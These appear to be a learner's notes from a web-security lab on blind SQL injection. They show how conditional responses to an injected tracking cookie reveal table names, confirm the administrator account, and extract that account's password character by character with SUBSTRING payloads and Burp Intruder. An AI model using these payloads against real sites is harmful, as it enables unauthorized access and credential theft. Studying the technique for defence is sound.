Exploiting blind SQL injection by triggering conditional responses

With blind SQL injection vulnerabilities, many techniques such as UNION attacks, 
are not effective because they rely on being able to see the results of the injected 
query within the application's responses. It is still possible to exploit 
blind SQL injection to access unauthorized data, but different techniques must be used.

Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4

sql quary be like ->
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'



depending on an injected condition. To see how this works
…xyz' AND '1'='1
…xyz' AND '1'='2


TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a   ---> verifing the table name 

TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a ---> verifing the administrator

TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a  ---> gettiing the length of password


uning burp indruder to get the password

TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§

TrackingId=xyz' AND (SELECT SUBSTRING(password,§2§,1) FROM users WHERE username='administrator')='§a§
